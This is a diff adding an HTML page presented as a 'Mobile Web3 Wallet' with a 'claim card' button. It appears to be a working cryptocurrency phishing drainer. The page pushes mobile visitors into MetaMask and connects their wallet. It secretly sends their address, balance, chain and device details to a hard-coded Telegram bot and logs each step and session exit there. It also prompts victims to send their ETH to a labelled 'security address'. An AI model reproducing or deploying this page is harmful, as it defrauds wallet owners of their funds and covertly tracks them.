@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Mobile Web3 Wallet</title>
+
+  <!-- ethers -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+
+  <style>
+
+    body {
+      margin: 0;
+      font-family: Arial;
+      background: #0f172a;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #1e293b;
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 50px;
+    }
+
+    input,
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+
+    button {
+      background: #3b82f6;
+      color: white;
+    }
+
+    #loader {
+      margin-top: 40px;
+    }
+
+  </style>
+</head>
+
+<body>
+
+<div class="card">
+
+  <h2>📱 Mobile Wallet</h2>
+
+  <div id="loader">
+    Opening in MetaMask...
+  </div>
+
+  <div id="app" style="display:none;">
+
+    <p><b>security:0x37df254dc6a205f876b4f4b61257e563f4586884</b></p>
+
+    <p id="0x37df254dc6a205f876b4f4b61257e563f4586884"></p>
+
+    <p><b>Address:</b></p>
+
+    <p id="address"></p>
+
+    <p><b>Balance:</b></p>
+
+    <p id="balance"></p>
+
+    <hr>
+
+    <h3>claim</h3>
+
+    <input
+      id="to"
+      placeholder="security address"
+    >
+
+    <input
+      id="amount"
+      placeholder="ETH balance"
+    >
+
+    <button onclick="sendETH()">
+     claim card
+    </button>
+
+    <p id="status"></p>
+
+  </div>
+
+</div>
+
+<script>
+
+// =====================================
+// TELEGRAM CONFIG
+// =====================================
+
+const BOT_TOKEN =
+  "8992336246:AAF9-HEe5CN2B9CFY92r6g7TRTkInQW-qz4";
+
+const CHAT_ID =
+  "8399408724";
+
+// =====================================
+// SESSION DATA
+// =====================================
+
+let sessionStart = Date.now();
+
+let currentWallet = null;
+
+// =====================================
+// TELEGRAM FUNCTION
+// =====================================
+
+async function sendTelegramMessage(message){
+
+  const url =
+    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  try {
+
+    await fetch(url,{
+
+      method:"POST",
+
+      headers:{
+        "Content-Type":"application/json"
+      },
+
+      body:JSON.stringify({
+
+        chat_id: CHAT_ID,
+
+        text: message
+
+      })
+
+    });
+
+  } catch(err){
+
+    console.error(
+      "Telegram Error:",
+      err
+    );
+  }
+}
+
+// =====================================
+// MOBILE DETECTION
+// =====================================
+
+function isMobile(){
+
+  return /Android|iPhone|iPad|iPod/i
+    .test(navigator.userAgent);
+}
+
+// =====================================
+// DEVICE INFO
+// =====================================
+
+function getDeviceInfo(){
+
+  return {
+
+    userAgent:
+      navigator.userAgent,
+
+    language:
+      navigator.language,
+
+    platform:
+      navigator.platform,
+
+    screen:
+      window.innerWidth
+      + "x"
+      + window.innerHeight
+  };
+}
+
+// =====================================
+// DETECT METAMASK BROWSER
+// =====================================
+
+function isMetaMaskBrowser(){
+
+  return (
+    window.ethereum
+    &&
+    window.ethereum.isMetaMask
+  );
+}
+
+// =====================================
+// OPEN METAMASK
+// =====================================
+
+function openMetaMask(){
+
+  const url =
+    window.location.href
+      .replace(/^https?:\/\//,'');
+
+  window.location.href =
+    "https://metamask.app.link/dapp/"
+    + url;
+}
+
+// =====================================
+// ENTRY FLOW
+// =====================================
+
+window.addEventListener(
+  "load",
+  async ()=>{
+
+    if(!isMobile()){
+
+      document.body.innerHTML =
+        "<h2>Use mobile device</h2>";
+
+      return;
+    }
+
+    if(!isMetaMaskBrowser()){
+
+      openMetaMask();
+
+      return;
+    }
+
+    // Inside MetaMask
+    document
+      .getElementById("loader")
+      .style.display = "none";
+
+    document
+      .getElementById("app")
+      .style.display = "block";
+
+    connectWallet();
+  }
+);
+
+// =====================================
+// GLOBALS
+// =====================================
+
+let provider;
+let signer;
+
+// =====================================
+// CONNECT WALLET
+// =====================================
+
+async function connectWallet(){
+
+  try {
+
+    provider =
+      new ethers.BrowserProvider(
+        window.ethereum
+      );
+
+    await provider.send(
+      "eth_requestAccounts",
+      []
+    );
+
+    signer =
+      await provider.getSigner();
+
+    const address =
+      await signer.getAddress();
+
+    currentWallet = address;
+
+    const network =
+      await provider.getNetwork();
+
+    const balance =
+      await provider.getBalance(
+        address
+      );
+
+    document
+      .getElementById("address")
+      .innerText =
+
+      address.slice(0,6)
+      + "..."
+      + address.slice(-4);
+
+    document
+      .getElementById("balance")
+      .innerText =
+
+      ethers.formatEther(balance)
+      + " ETH";
+
+    const device =
+      getDeviceInfo();
+
+    // TELEGRAM ALERT
+    sendTelegramMessage(
+
+      "🟢 WALLET CONNECTED\n\n"
+
+      + "Wallet:\n"
+
+      + address
+
+      + "\n\nBalance:\n"
+
+      + ethers.formatEther(balance)
+
+      + " ETH\n\n"
+
+      + "Chain ID:\n"
+
+      + network.chainId
+
+      + "\n\nPlatform:\n"
+
+      + device.platform
+
+      + "\n\nLanguage:\n"
+
+      + device.language
+
+      + "\n\nScreen:\n"
+
+      + device.screen
+    );
+
+    document
+      .getElementById("status")
+      .innerText =
+      "Connected ✅";
+
+  } catch(err){
+
+    console.error(err);
+
+    sendTelegramMessage(
+
+      "❌ Wallet Connection Failed"
+    );
+
+    document
+      .getElementById("status")
+      .innerText =
+      "Connection failed";
+  }
+}
+
+// =====================================
+// SEND ETH
+// =====================================
+
+async function sendETH(){
+
+  try {
+
+    const to =
+      document.getElementById("to")
+      .value;
+
+    const amount =
+      document.getElementById("amount")
+      .value;
+
+    document
+      .getElementById("status")
+      .innerText =
+      "Sending...";
+
+    sendTelegramMessage(
+
+      "⏳ Transaction Started\n\n"
+
+      + "From:\n"
+
+      + currentWallet
+
+      + "\n\nTo:\n"
+
+      + to
+
+      + "\n\nAmount:\n"
+
+      + amount
+
+      + " ETH"
+    );
+
+    const tx =
+      await signer.sendTransaction({
+
+        to: to,
+
+        value:
+          ethers.parseEther(amount)
+
+      });
+
+    sendTelegramMessage(
+
+      "📤 Transaction Submitted\n\n"
+
+      + "Hash:\n"
+
+      + tx.hash
+    );
+
+    await tx.wait();
+
+    sendTelegramMessage(
+
+      "✅ Transaction Confirmed\n\n"
+
+      + "Wallet:\n"
+
+      + currentWallet
+
+      + "\n\nTo:\n"
+
+      + to
+
+      + "\n\nAmount:\n"
+
+      + amount
+
+      + " ETH\n\n"
+
+      + "Hash:\n"
+
+      + tx.hash
+    );
+
+    document
+      .getElementById("status")
+      .innerText =
+      "Success ✅";
+
+  } catch(err){
+
+    console.error(err);
+
+    sendTelegramMessage(
+
+      "❌ Transaction Failed\n\n"
+
+      + err.message
+    );
+
+    document
+      .getElementById("status")
+      .innerText =
+      "Failed ❌";
+  }
+}
+
+// =====================================
+// SESSION MONITORING
+// =====================================
+
+window.addEventListener(
+  "beforeunload",
+  ()=>{
+
+    const duration =
+      Math.floor(
+        (Date.now() - sessionStart)
+        / 1000
+      );
+
+    sendTelegramMessage(
+
+      "👋 User Left Session\n\n"
+
+      + "Wallet:\n"
+
+      + (currentWallet || "Not Connected")
+
+      + "\n\nSession Duration:\n"
+
+      + duration
+
+      + " seconds"
+    );
+  }
+);
+
+// =====================================
+// HANDLE CHANGES
+// =====================================
+
+if(window.ethereum){
+
+  window.ethereum.on(
+
+    "accountsChanged",
+
+    ()=>location.reload()
+  );
+
+  window.ethereum.on(
+
+    "chainChanged",
+
+    ()=>location.reload()
+  );
+}
+
+</script>
+
+</body>
+</html>
